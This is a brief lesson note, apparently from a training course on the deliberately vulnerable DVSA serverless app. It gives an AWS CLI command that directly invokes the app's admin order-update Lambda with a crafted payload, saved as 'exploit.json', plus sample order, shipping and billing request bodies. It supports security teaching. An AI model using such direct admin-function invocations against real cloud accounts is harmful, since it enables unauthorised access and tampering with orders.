# Lesson 05 Commands

Representative admin update invoke:

```bash
aws lambda invoke \
  --function-name DVSA-ADMIN-UPDATE-ORDERS \
  --cli-binary-format raw-in-base64-out \
  --payload file://admin-compact.json \
  --region us-east-1 \
  exploit.json

jq . exploit.json
```

Normal order flow request shapes:

```json
{"action":"new","cart-id":"CART_ID","items":{"ITEM_ID":1}}
{"action":"shipping","order-id":"ORDER_ID","data":{"address":"ADDR","email":"EMAIL","name":"NAME"}}
{"action":"billing","order-id":"ORDER_ID","data":{"ccn":"4242424242424242","exp":"11/22","cvv":"123"}}
```
